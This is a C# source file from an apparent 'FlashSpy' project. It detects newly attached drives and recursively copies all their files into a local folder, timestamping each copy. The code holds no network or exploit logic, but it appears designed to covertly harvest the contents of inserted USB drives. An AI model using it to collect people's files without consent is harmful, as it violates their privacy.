using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace FlashSpyCore
{
    class DirectoryAdmin
    {
        private FlashSpyDbContext dbContext;
        public List<string> directories { get; private set; }
        private string copyDirectory;

        public DirectoryAdmin(FlashSpyDbContext context)
        {
            this.dbContext = context;
            this.copyDirectory = context.Settings.FirstOrDefault().CopyFolder;
            directories = GetDirectories();
        }

        public List<string> GetDirectories()
        {
            return Environment.GetLogicalDrives().ToList();
        }

        public List<string> GetFlashDirectories()
        {
            List<string> tmpDirs = GetDirectories().Except(directories).ToList();
            this.directories = GetDirectories();

            return tmpDirs;
        }

        public bool CopyFiles(List<string> fromDir, string toDir)
        {
            try
            {
                foreach (string directory in fromDir)
                {
                    CopyFiles(directory, toDir);
                }

                return true;
            }
            catch (Exception ex)
            {
                return false;
            }
        }

        public bool CopyFiles(string fromDir, string toDir, bool isRecursy = false)
        {
            try
            {
                string newDirectory = toDir;

                if (!isRecursy)
                {
                    newDirectory += $"\\{fromDir.Replace("\\", "")}# Date {DateTime.Now.ToShortDateString()} # Time {DateTime.Now.ToLongTimeString()}".Replace(":", "-");
                }

                Directory.CreateDirectory(newDirectory);

                foreach (string tmpFilePath in Directory.GetFiles(fromDir))
                {
                    string pathCopyTo = $"{newDirectory}\\{Path.GetFileName(tmpFilePath)}";
                    File.Copy(tmpFilePath, pathCopyTo);
                }

                var tmp = Directory.GetDirectories(fromDir);

                foreach (string tmpDirPath in tmp)
                {
                    CopyFiles(tmpDirPath, $"{newDirectory}\\{Path.GetFileName(tmpDirPath)}", isRecursy: true);
                }

                return true;
            }
            catch (Exception ex)
            {
                return false;
            }
        }

        public void FlashRendering(object obj = null)
        {
            List<string> flashDirectories = GetFlashDirectories();
            bool result;

            if (flashDirectories.Count > 0)
            {
                result = CopyFiles(flashDirectories, copyDirectory);

                if (result)
                {
                    Printer.PrintSuccessMessage("Files copied successful!");
                }
                else
                {
                    Printer.PrintDangerMessage("Error! Files not copied!");
                }
            }
        }
    }
}
